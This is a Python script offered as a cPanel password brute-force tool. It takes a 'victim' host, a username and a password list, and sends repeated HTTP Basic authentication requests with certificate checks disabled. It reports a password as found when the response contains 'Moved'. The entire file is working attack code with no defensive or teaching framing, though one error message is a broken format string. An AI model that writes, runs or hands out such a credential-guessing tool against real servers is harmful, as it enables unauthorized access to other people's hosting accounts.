import argparse
import base64
import socket
import sys
import urllib.request
import ssl

'''

 _____                        _  ______            _      ______
/  __ \                      | | | ___ \          | |     |  ___|
| /  \/_ __   __ _ _ __   ___| | | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___
| |   | '_ \ / _` | '_ \ / _ \ | | ___ \ '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \
| \__/\ |_) | (_| | | | |  __/ | | |_/ / |  | |_| | ||  __/ || (_) | | | (_|  __/
 \____/ .__/ \__,_|_| |_|\___|_| \____/|_|   \__,_|\__\___\_| \___/|_|  \___\___|
      | |
      |_|

'''

context = ssl._create_unverified_context()
url = ''
def main():
    parser = argparse.ArgumentParser(description='Cpanel Password Brute Force Tool')
    parser.add_argument('host', help='victim Host (127.0.0.1)')
    parser.add_argument('ssl', help='ssl true or false (default is true)')
    parser.add_argument('user', help='User Name (demo)')
    parser.add_argument('port', type=int, help='Port of Cpanel (2082)')
    parser.add_argument('list', help='File Of password list (list.txt)')
    parser.add_argument('file', help='file for save password (password.txt)')
    args = parser.parse_args()
    global url
    if args.ssl == 'TRUE' or args.ssl == 'true':
        url = f"https://{args.host}:{args.port}"
    else:
        url = f"http://{args.host}:{args.port}"

    print(f"\n [~] Start Brute Force on {url} \n")

    with open(args.list, 'r') as passfile:
        passwords = passfile.readlines()

    for passwd in passwords:
        passwd = passwd.strip()
        print(f"\n [~] Try Password : {passwd} \n")
        try:
            brut(args.host, args.port, args.user, passwd)
        except:
            print("\n [-] Error while trying password: {passwd} \n")
        

def brut(host, port, user, passwd):
    global url
    global context

    authx = base64.b64encode(f"{user}:{passwd}".encode('utf-8')).decode('ascii')
    print(authx)
    try:
        sock = socket.create_connection((host, port))
    except:
        print("\n [-] Can not connect to the host")
        return

    req = urllib.request.Request(url)
    req.add_header('Authorization', f'Basic {authx}')
    req.add_header('Connection', 'Close')

    try:
        with urllib.request.urlopen(req, context=context) as response:
            answer = response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        answer = e.read().decode('utf-8')

    if 'Moved' in answer:
        print(f"\n [~] PASSWORD FOUND : {passwd} \n")
        sys.exit()

if __name__ == '__main__':
    main()
